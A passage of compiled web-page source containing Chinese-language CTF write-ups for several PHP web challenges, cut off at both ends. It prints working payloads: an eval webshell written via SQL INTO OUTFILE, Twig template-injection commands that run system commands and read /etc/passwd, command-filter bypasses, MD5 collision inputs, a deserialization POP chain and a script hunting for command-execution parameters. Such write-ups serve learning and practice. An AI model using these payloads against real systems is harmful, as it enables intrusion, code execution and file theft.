\u6211\u4eec\u4e5f\u53ef\u4ee5\u5199\u8fdb\u4e00\u53e5\u8bdd\u6728\u9a6c"}),"\n",(0,i.jsx)(e.p,{children:"\u5c1d\u8bd5"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'select "<?php eval($_POST[\'hacker\']);?>" into OUTFILE "/var/www/html/hacker.php"\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91cc\u60f3\u5229\u7528sql\u5199\u5165\u6587\u4ef6\u7684\u6f0f\u6d1e\uff0c\u53d1\u73b0\u5229\u7528\u4e0d\u6210\u529f"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"\u9519\u8bef\r\nSQL \u67e5\u8be2\uff1a \u6587\u6863\r\nselect \"<?php eval($_POST['hacker']);?>\" into OUTFILE \"/var/www/html/hacker.php\"\r\nMySQL \u8fd4\u56de\uff1a \u6587\u6863\r\n#1045 - Access denied for user 'test'@'%' (using password: YES)\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5229\u7528dirseaerch"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240217225409804.png",alt:"image-20240217225409804"})}),"\n",(0,i.jsx)(e.p,{children:"\u5229\u7528githack\u83b7\u53d6\u6e90\u7801"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240217225501319.png",alt:"image-20240217225501319"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\n\r\ninclude 'flag.php';\r\n\r\n$yds = \"dog\";\r\n$is = \"cat\";\r\n$handsome = 'yds';\r\n\r\nforeach($_POST as $x => $y){\r\n    $$x = $y;\r\n}\r\n\r\nforeach($_GET as $x => $y){\r\n    $$x = $$y;\r\n}\r\n\r\nforeach($_GET as $x => $y){\r\n    if($_GET['flag'] === $x && $x !== 'flag'){\r\n        exit($handsome);\r\n    }\r\n}\r\n\r\nif(!isset($_GET['flag']) && !isset($_POST['flag'])){\r\n    exit($yds);\r\n}\r\n\r\nif($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){\r\n    exit($is);\r\n}\r\necho \"the flag is: \".$flag;\n"})}),"\n",(0,i.jsx)(e.p,{children:"foreach\u51fd\u6570\uff0c\u5faa\u73af\u904d\u5386\u6570\u7ec4\u7684\u952e\u548c\u503c"}),"\n",(0,i.jsx)(e.p,{children:"exit\u51fd\u6570\uff0c\u8f93\u51fa\u4e00\u5219\u6d88\u606f\u5e76\u4e14\u7ec8\u6b62\u5f53\u524d\u811a\u672c"}),"\n",(0,i.jsx)(e.p,{children:"\u89e3\u6cd5\u4e00"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"foreach($_GET as $x => $y){\r\n    if($_GET['flag'] === $x && $x !== 'flag'){\r\n        exit($handsome);\r\n    }\r\n}\r\n?handsome=flag&flag=handsome\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u89e3\u6cd5\u4e8c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"if(!isset($_GET['flag']) && !isset($_POST['flag'])){\r\n    exit($yds);\r\n}\r\n?yds=flag\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u89e3\u6cd5\u4e09"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){\r\n    exit($is);\r\n}\r\n?flag=flag&is=flag\n"})}),"\n",(0,i.jsx)(e.h2,{id:"wustctf2020\u6734\u5b9e\u65e0\u534e",children:"[WUSTCTF2020]\u6734\u5b9e\u65e0\u534e"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'<?php\r\nheader(\'Content-type:text/html;charset=utf-8\');\r\nerror_reporting(0);\r\nhighlight_file(__file__);\r\n\r\n\r\n//level 1\r\nif (isset($_GET[\'num\'])){\r\n    $num = $_GET[\'num\'];\r\n    if(intval($num) < 2020 && intval($num + 1) > 2021){\r\n        echo "\u6211\u4e0d\u7ecf\u610f\u95f4\u770b\u4e86\u770b\u6211\u7684\u52b3\u529b\u58eb, \u4e0d\u662f\u60f3\u770b\u65f6\u95f4, \u53ea\u662f\u60f3\u4e0d\u7ecf\u610f\u95f4, \u8ba9\u4f60\u77e5\u9053\u6211\u8fc7\u5f97\u6bd4\u4f60\u597d.</br>";\r\n    }else{\r\n        die("\u91d1\u94b1\u89e3\u51b3\u4e0d\u4e86\u7a77\u4eba\u7684\u672c\u8d28\u95ee\u9898");\r\n    }\r\n}else{\r\n    die("\u53bb\u975e\u6d32\u5427");\r\n}\r\n//level 2\r\nif (isset($_GET[\'md5\'])){\r\n   $md5=$_GET[\'md5\'];\r\n   if ($md5==md5($md5))\r\n       echo "\u60f3\u5230\u8fd9\u4e2aCTFer\u62ff\u5230flag\u540e, \u611f\u6fc0\u6d95\u96f6, \u8dd1\u53bb\u4e1c\u6f9c\u5cb8, \u627e\u4e00\u5bb6\u9910\u5385, \u628a\u53a8\u5e08\u8f70\u51fa\u53bb, \u81ea\u5df1\u7092\u4e24\u4e2a\u62ff\u624b\u5c0f\u83dc, \u5012\u4e00\u676f\u6563\u88c5\u767d\u9152, \u81f4\u5bcc\u6709\u9053, \u522b\u5b66\u5c0f\u66b4.</br>";\r\n   else\r\n       die("\u6211\u8d76\u7d27\u558a\u6765\u6211\u7684\u9152\u8089\u670b\u53cb, \u4ed6\u6253\u4e86\u4e2a\u7535\u8bdd, \u628a\u4ed6\u4e00\u5bb6\u5b89\u6392\u5230\u4e86\u975e\u6d32");\r\n}else{\r\n    die("\u53bb\u975e\u6d32\u5427");\r\n}\r\n\r\n//get flag\r\nif (isset($_GET[\'get_flag\'])){\r\n    $get_flag = $_GET[\'get_flag\'];\r\n    if(!strstr($get_flag," ")){\r\n        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);\r\n        echo "\u60f3\u5230\u8fd9\u91cc, \u6211\u5145\u5b9e\u800c\u6b23\u6170, \u6709\u94b1\u4eba\u7684\u5feb\u4e50\u5f80\u5f80\u5c31\u662f\u8fd9\u4e48\u7684\u6734\u5b9e\u65e0\u534e, \u4e14\u67af\u71e5.</br>";\r\n        system($get_flag);\r\n    }else{\r\n        die("\u5feb\u5230\u975e\u6d32\u4e86");\r\n    }\r\n}else{\r\n    die("\u53bb\u975e\u6d32\u5427");\r\n}\r\n?> \n'})}),"\n",(0,i.jsx)(e.p,{children:"\u7b2c\u4e00\u5173"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"num=2e4\r\nintval\u4f1a\u89e3\u6790\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u4e14\u5f53\u89e3\u6790\u5b57\u7b26\u4e32\u65f6\u4f1a\u4fdd\u7559\u7b2c\u4e00\u4e2a\u5b57\u7b26\u524d\u7684\u6570\u5b57\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u7b2c\u4e8c\u5173"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"$md5==md5($md5)\r\n\u8fd9\u91cc\u662f==\u5f31\u6bd4\u8f83\uff0c\r\nmd5=0e215962017\r\n\u8fd9\u68370==0(true)\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u7b2c\u4e09\u5173"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"\u8fc7\u6ee4\u4e86\u7a7a\u683c\uff0ccat\r\nget_flag=tac${IFS}flllll*\n"})}),"\n",(0,i.jsx)(e.h2,{id:"bjdctf2020cookie-is-so-stable",children:"[BJDCTF2020]Cookie is so stable"}),"\n",(0,i.jsx)(e.p,{children:"\u53d1\u73b0\u8f93\u5165\u4ec0\u4e48\u90fd\u4f1a\u56de\u663e\u8f93\u5165\u7684\u6570\u636e,\u8fd9\u65f6\u5019\u8003\u8651\u662f\u4e0d\u662f\u6a21\u677f\u6ce8\u5165\u4e86\u3002\u6839\u636ehint\uff0c\u6ce8\u5165\u70b9\u5b58\u5728\u4e8ecookie\u4e2d"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"{{7*'7'}} \u56de\u663e7777777 ==> Jinja2\r\n{{7*'7'}} \u56de\u663e49 ==> Twig \n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"include 'vendor/twig/twig/lib/Twig/Autoloader.php';\r\nTwig_Autoloader::register();\r\n$loader = new Twig_Loader_String();\r\n$twig = new Twig_Environment($loader);\r\ntry{\r\n\t$result = @$twig->render($_COOKIE['user']);\r\n\techo \"  Hello $result\";\r\n\t} catch (Exception $e){\r\n\t\techo \"  What do you want to do?\";\r\n}\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u4ee3\u7801\u76f4\u63a5\u6e32\u67d3\u4e86user\u7684\u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5229\u7528"}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}\r\n{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u5176\u4ed6payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'{{\'/etc/passwd\'|file_excerpt(1,30)}}\r\n{{app.request.files.get(1).__construct(\'/etc/passwd\',\'\')}}\r\n{{app.request.files.get(1).openFile.fread(99)}}\r\n{{_self.env.registerUndefinedFilterCallback("exec")}}\r\n{{_self.env.getFilter("whoami")}}\r\n{{_self.env.enableDebug()}}{{_self.env.isDebug()}}\r\n{{["id"]|map("system")|join(",")\r\n{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}\r\n{{["id",0]|sort("system")|join(",")}}\r\n{{["id"]|filter("system")|join(",")}}\r\n{{[0,0]|reduce("system","id")|join(",")}}\r\n{{[\'cat /etc/passwd\']|filter(\'system\')}}\n'})}),"\n",(0,i.jsx)(e.h2,{id:"\u5b89\u6d35\u676f-2019easy_web",children:"[\u5b89\u6d35\u676f 2019]easy_web"}),"\n",(0,i.jsx)(e.p,{children:"\u6253\u5f00\u7f51\u7ad9\u53d1\u73b0\u6709\u4e24\u4e2a\u53c2\u6570"}),"\n",(0,i.jsx)(e.p,{children:"img\u548ccmd"}),"\n",(0,i.jsx)(e.p,{children:"\u5bf9TXpVek5UTTFNbVUzTURabE5qYz0\u8fdb\u884c\u89e3\u7801"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240218160048220.png",alt:"image-20240218160048220"})}),"\n",(0,i.jsx)(e.p,{children:"\u5e94\u8be5\u5b58\u5728\u6587\u4ef6\u5305\u542b\uff0c\u5c1d\u8bd5\u8bfb\u53d6index.php"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240218160329735.png",alt:"image-20240218160329735"})}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&cmd=11\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5f97\u5230\u6e90\u7801"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php+HTML",children:'<?php\r\nerror_reporting(E_ALL || ~ E_NOTICE);\r\nheader(\'content-type:text/html;charset=utf-8\');\r\n$cmd = $_GET[\'cmd\'];\r\nif (!isset($_GET[\'img\']) || !isset($_GET[\'cmd\'])) \r\n    header(\'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=\');\r\n$file = hex2bin(base64_decode(base64_decode($_GET[\'img\'])));\r\n\r\n$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);\r\nif (preg_match("/flag/i", $file)) {\r\n    echo \'<img src ="./ctf3.jpeg">\';\r\n    die("xixi\uff5e no flag");\r\n} else {\r\n    $txt = base64_encode(file_get_contents($file));\r\n    echo "<img src=\'data:image/gif;base64," . $txt . "\'></img>";\r\n    echo "<br>";\r\n}\r\necho $cmd;\r\necho "<br>";\r\nif (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\\'|\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i", $cmd)) {\r\n    echo("forbid ~");\r\n    echo "<br>";\r\n} else {\r\n    if ((string)$_POST[\'a\'] !== (string)$_POST[\'b\'] && md5($_POST[\'a\']) === md5($_POST[\'b\'])) {\r\n        echo `$cmd`;\r\n    } else {\r\n        echo ("md5 is funny ~");\r\n    }\r\n}\r\n\r\n?>\r\n<html>\r\n<style>\r\n  body{\r\n   background:url(./bj.png)  no-repeat center center;\r\n   background-size:cover;\r\n   background-attachment:fixed;\r\n   background-color:#CCCCCC;\r\n}\r\n</style>\r\n<body>\r\n</body>\r\n</html>\n'})}),"\n",(0,i.jsxs)(e.p,{children:["img\u8fd9\u6761\u8def\u88ab\u5835\u6b7b\u4e86\uff0c\u5f00\u5934\u6709",(0,i.jsx)(e.code,{children:"/[^a-zA-Z0-9.]+/"}),"\uff0c\u5c31\u4f1a\u88ab\u66ff\u6362\u4e3a\u7a7a"]}),"\n",(0,i.jsx)(e.p,{children:"\u63a5\u7740\u770bcmd\u53c2\u6570"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\r\n        echo `$cmd`;\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91cc\u662fMD5\u7684\u5f3a\u7c7b\u578b\uff0c\u9700\u8981\u8fdb\u884c\u78b0\u649e\u3002\u627e\u4e86\u4e00\u5bf9\u503c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6700\u540e\u5c31\u662f\u6267\u884c\u547d\u4ee4\uff0c\u7ed5\u8fc7\u8fc7\u6ee4\u4e86"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'\u8fd9\u91cc\u8fc7\u6ee4\u4e86\u8bb8\u591a\uff0c\u91cd\u70b9\u5728\u8fd9"|\\\\|\\\\\\\\|"\uff0cphp\u4e2d\u4f1a\u7ecf\u5386\u4e24\u6b21\u89e3\u6790\uff0cphp\u89e3\u6790\u4e0e\u6b63\u5219\u89e3\u6790\u3002\u7b2c\u4e00\u6b21php\u8f6c\u4e49\u4e3a"|\\|\\\\|",\u7b2c\u4e8c\u6b21\u6b63\u5219\u8f6c\u4e49\uff0c\u5c06\u4e2d\u95f4\u7684**|**\u8f6c\u4e49\u4e3a\u666e\u901a\u5b57\u7b26\uff0c\u7ed3\u679c\u4e3a"||\\|"\u3002\u6240\u4ee5\u5b9e\u9645\u4e0a\u5339\u914d\u7684\u662f"|\\"\u3002\u5b83\u6ca1\u6709\u8fc7\u6ee4"\\"\u7b26\u53f7\u3002\n'})}),"\n",(0,i.jsxs)(e.p,{children:["\u5728linux\u7cfb\u7edf\u91cc\uff0c\u5728\u547d\u4ee4\u91cc\u53ef\u4ee5\u52a0\u5165",(0,i.jsx)(e.code,{children:"\\"})]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"cmd=c\\at%20f\\lag\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6700\u7ec8\u7684payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"cmd=dir%20/  \u67e5\u770b\u6839\u76ee\u5f55\r\ncmd=c\\at%20f\\lag\n"})}),"\n",(0,i.jsx)(e.h2,{id:"mrctf2020ezpop",children:"[MRCTF2020]Ezpop"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:" <?php\r\n//flag is in flag.php\r\n//WTF IS THIS?\r\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\r\n//And Crack It!\r\nclass Modifier {\r\n    protected  $var;\r\n    public function append($value){\r\n        include($value);\r\n    }\r\n    public function __invoke(){\r\n        $this->append($this->var);\r\n    }\r\n}\r\n\r\nclass Show{\r\n    public $source;\r\n    public $str;\r\n    public function __construct($file='index.php'){\r\n        $this->source = $file;\r\n        echo 'Welcome to '.$this->source.\"<br>\";\r\n    }\r\n    public function __toString(){\r\n        return $this->str->source;\r\n    }\r\n\r\n    public function __wakeup(){\r\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {\r\n            echo \"hacker\";\r\n            $this->source = \"index.php\";\r\n        }\r\n    }\r\n}\r\n\r\nclass Test{\r\n    public $p;\r\n    public function __construct(){\r\n        $this->p = array();\r\n    }\r\n\r\n    public function __get($key){\r\n        $function = $this->p;\r\n        return $function();\r\n    }\r\n}\r\n\r\nif(isset($_GET['pop'])){\r\n    @unserialize($_GET['pop']);\r\n}\r\nelse{\r\n    $a=new Show;\r\n    highlight_file(__FILE__);\r\n} \n"})}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'<?php\r\nclass Modifier {\r\n    protected  $var = "php://filter/convert.base64-encode/resource=flag.php";\r\n    public function append($value){\r\n        include($value);\r\n    }\r\n    public function __invoke(){\r\n        $this->append($this->var);\r\n    }\r\n}\r\n\r\nclass Show{\r\n    public $source;\r\n    public $str;\r\n    public function __toString(){\r\n        return $this->str->source;\r\n    }\r\n\r\n    public function __wakeup(){\r\n        if(preg_match("/gopher|http|file|ftp|https|dict|\\.\\./i", $this->source)) {\r\n            echo "hacker";\r\n            $this->source = "index.php";\r\n        }\r\n    }\r\n}\r\n\r\nclass Test{\r\n    public $p;\r\n    public function __construct(){\r\n        $this->p = array();\r\n    }\r\n\r\n    public function __get($key){\r\n        $function = $this->p;\r\n        return $function();\r\n    }\r\n}\r\n\r\n$a = new Show();\r\n$a->source = new Show();\r\n$a->source->str = new Test();\r\n$a->source->str->p = new Modifier();\r\necho urlencode(serialize($a));\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u6574\u4e2a\u6d41\u7a0b"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240218163744126.png",alt:""})}),"\n",(0,i.jsx)(e.h2,{id:"\u5f3a\u7f51\u676f-2019\u9ad8\u660e\u7684\u9ed1\u5ba2",children:"[\u5f3a\u7f51\u676f 2019]\u9ad8\u660e\u7684\u9ed1\u5ba2"}),"\n",(0,i.jsx)(e.p,{children:"\u627e\u5230\u4e86\u5229\u7528\u6587\u4ef6\uff1a xk0SzyKwfzw.php  and \u627e\u5230\u4e86\u5229\u7528\u7684\u53c2\u6570\uff1aEfa5BVG"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-python",children:"import os\r\nimport requests\r\nimport re\r\nimport threading\r\nimport time\r\nprint('\u5f00\u59cb\u65f6\u95f4\uff1a  '+  time.asctime( time.localtime(time.time()) ))\r\ns1=threading.Semaphore(50)                                            #\u8fd9\u513f\u8bbe\u7f6e\u6700\u5927\u7684\u7ebf\u7a0b\u6570\r\nfilePath = r\"D:\\phpstudy_pro\\WWW\\src\"\r\nos.chdir(filePath)                                                    #\u6539\u53d8\u5f53\u524d\u7684\u8def\u5f84\r\nrequests.adapters.DEFAULT_RETRIES = 5                                #\u8bbe\u7f6e\u91cd\u8fde\u6b21\u6570\uff0c\u9632\u6b62\u7ebf\u7a0b\u6570\u8fc7\u9ad8\uff0c\u65ad\u5f00\u8fde\u63a5\r\nfiles = os.listdir(filePath)\r\nsession = requests.Session()\r\nsession.keep_alive = False                                             # \u8bbe\u7f6e\u8fde\u63a5\u6d3b\u8dc3\u72b6\u6001\u4e3aFalse\r\ndef get_content(file):\r\n    s1.acquire()\r\n    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))\r\n    with open(file,encoding='utf-8') as f:                            #\u6253\u5f00php\u6587\u4ef6\uff0c\u63d0\u53d6\u6240\u6709\u7684$_GET\u548c$_POST\u7684\u53c2\u6570\r\n            gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read()))\r\n            posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read()))\r\n    data = {}                                                        #\u6240\u6709\u7684$_POST\r\n    params = {}                                                        #\u6240\u6709\u7684$_GET\r\n    for m in gets:\r\n        params[m] = \"echo 'xxxxxx';\"\r\n    for n in posts:\r\n        data[n] = \"echo 'xxxxxx';\"\r\n    url = 'http://127.0.0.1/src/'+file\r\n    req = session.post(url, data=data, params=params)            #\u4e00\u6b21\u6027\u8bf7\u6c42\u6240\u6709\u7684GET\u548cPOST\r\n    req.close()                                                # \u5173\u95ed\u8bf7\u6c42  \u91ca\u653e\u5185\u5b58\r\n    req.encoding = 'utf-8'\r\n    content = req.text\r\n    #print(content)\r\n    if \"xxxxxx\" in content:                                    #\u5982\u679c\u53d1\u73b0\u6709\u53ef\u4ee5\u5229\u7528\u7684\u53c2\u6570\uff0c\u7ee7\u7eed\u7b5b\u9009\u51fa\u5177\u4f53\u7684\u53c2\u6570\r\n        flag = 0\r\n        for a in gets:\r\n            req = session.get(url+'?%s='%a+\"echo 'xxxxxx';\")\r\n            content = req.text\r\n            req.close()                                                # \u5173\u95ed\u8bf7\u6c42  \u91ca\u653e\u5185\u5b58\r\n            if \"xxxxxx\" in content:\r\n                flag = 1\r\n                break\r\n        if flag != 1:\r\n            for b in posts:\r\n                req = session.post(url, data={b:\"echo 'xxxxxx';\"})\r\n                content = req.text\r\n                req.close()                                                # \u5173\u95ed\u8bf7\u6c42  \u91ca\u653e\u5185\u5b58\r\n                if \"xxxxxx\" in content:\r\n                    break\r\n        if flag == 1:                                                    #flag\u7528\u6765\u5224\u65ad\u53c2\u6570\u662fGET\u8fd8\u662fPOST\uff0c\u5982\u679c\u662fGET\uff0cflag==1\uff0c\u5219b\u672a\u5b9a\u4e49\uff1b\u5982\u679c\u662fPOST\uff0cflag\u4e3a0\uff0c\r\n            param = a\r\n        else:\r\n            param = b\r\n        print('\u627e\u5230\u4e86\u5229\u7528\u6587\u4ef6\uff1a '+file+\"  and \u627e\u5230\u4e86\u5229\u7528\u7684\u53c2\u6570\uff1a%s\" %param)\r\n        print('\u7ed3\u675f\u65f6\u95f4\uff1a  ' + time.asctime(time.localtime(time.time())))\r\n    s1.release()\r\n\r\nfor i in files:                                                            #\u52a0\u5165\u591a\u7ebf\u7a0b\r\n   t = threading.Thread(target=get_content, args=(i,))\r\n   t.start()\n"})}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"/xk0SzyKwfzw.php?Efa5BVG=cat /flag\n"})}),"\n",(0,i.jsx)(e.h2,{id:"\u5b89\u6d35\u676f-2019easy_serialize_php",children:"[\u5b89\u6d35\u676f 2019]easy_serialize_php"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:" <?php\r\n\r\n$function = @$_GET['f'];\r\n\r\nfunction filter($img){\r\n    $filter_arr = array('php','flag','php5','php4','fl1g');\r\n    $filter = '/'.implode('|',$filter_arr).'/i';\r\n    return preg_replace($filter,'',$img);\r\n}\r\n\r\n\r\nif($_SESSION){\r\n    unset($_SESSION);\r\n}\r\n\r\n$_SESSION[\"user\"] = 'guest';\r\n$_SESSION['function'] = $function;\r\n\r\nextract($_POST);\r\n\r\nif(!$function){\r\n    echo '<a href=\"index.php?f=highlight_file\">source_code</a>';\r\n}\r\n\r\nif(!$_GET['img_path']){\r\n    $_SESSION['img'] = base64_encode('guest_img.png');\r\n}else{\r\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\r\n}\r\n\r\n$serialize_info = filter(serialize($_SESSION));\r\n\r\nif($function == 'highlight_file'){\r\n    highlight_file('index.php');\r\n}else if($function == 'phpinfo'){\r\n    eval('phpinfo();'); //maybe you can find something in here!\r\n}else if($function == 'show_image'){\r\n    $userinfo = unserialize($serialize_info);\r\n    echo file_get_contents(base64_decode($userinfo['img']));\r\n}\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u53ef\u63a7\u53c2\u6570\u6709"}),"\n",(0,i.jsx)(e.p,{children:"f\uff0cuser\uff0cfunction(\u8fd9\u91cc\u53ef\u4ee5\u5229\u7528extract\u51fd\u6570\u8fdb\u884c\u53d8\u91cf\u8986\u76d6)"}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u67e5\u770b\u4e00\u4e0bphpinfo\u91cc\u9762\uff0c\u53d1\u73b0\u6709\u4e2ad0g3_f1ag.php\u6587\u4ef6"}),"\n",(0,i.jsx)(e.p,{children:"\u57fa\u672c\u601d\u8def\u5c31\u6709\u4e86"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"\u4f7f$userinfo['img']\u7b49\u4e8eZDBnM19mMWFnLnBocA==\uff0c\u8bfb\u53d6d0g3_f1ag.php\u6587\u4ef6\u7684\u5185\u5bb9\n"})}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"$_SESSION['img'] = sha1(base64_encode($_GET['img_path']));"}),"\u8fd9\u91cc\u8fdb\u884csha1\u52a0\u5bc6\u5c31\u4e0d\u80fdbase64"]}),"\n",(0,i.jsx)(e.p,{children:"\u89e3\u7801\uff0c\u6240\u4ee5\u53ea\u80fd\u8d70if\u8fd9\u6761\u8def"}),"\n",(0,i.jsxs)(e.p,{children:["\u53d1\u73b0\u8fd9\u4e2a\u51fd\u6570",(0,i.jsx)(e.code,{children:"preg_replace"}),"\uff0c\u60f3\u5230\u4e86\u53ef\u4ee5\u8fdb\u884c\u5b57\u7b26\u4e32\u9003\u9038"]}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u5c06\u53d8\u91cf\u8d4b\u503c\u4e3a"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"$_SESSION[\"user\"] = 'guest';\r\n$_SESSION['function'] = '11';\r\n$_SESSION['img'] = base64_encode('d0g3_f1ag.php');\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5e8f\u5217\u5316\u7ed3\u679c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'a:3:{s:4:"user";s:5:"guest";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\n'})}),"\n",(0,i.jsxs)(e.p,{children:["\u5982\u679c\u60f3\u8ba9img\u53c2\u6570\u8fdb\u884c\u89e3\u6790\uff0c\u6211\u4eec\u9700\u8981\u5403\u7684\u5b57\u7b26\u4e32\u662f",(0,i.jsx)(e.code,{children:'";s:8:"function";s:2:"11'}),"24\u4e2a\u5b57\u7b26\uff0c6\u4e2aflag\u6b63\u597d\u662f24\u4e2a\u5b57\u7b26"]}),"\n",(0,i.jsx)(e.p,{children:"\u8d4b\u503c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"$_SESSION[\"user\"] = 'guestflagflagflagflagflagflag';\r\n$_SESSION['function'] = '11';\r\n$_SESSION['img'] = base64_encode('d0g3_f1ag.php');\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5e8f\u5217\u5316\u7ed3\u679c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'a:3:{s:4:"user";s:29:"guest";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u6837img\u53c2\u6570\u5c31\u53ef\u4ee5\u89e3\u6790\uff0c\u4f46function\u53c2\u6570\u6ca1\u4e86\uff0c\u6211\u4eec\u8981\u52a0\u4e0afunction\u53c2\u6570"}),"\n",(0,i.jsx)(e.p,{children:"\u8d4b\u503c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'$_SESSION["user"] = 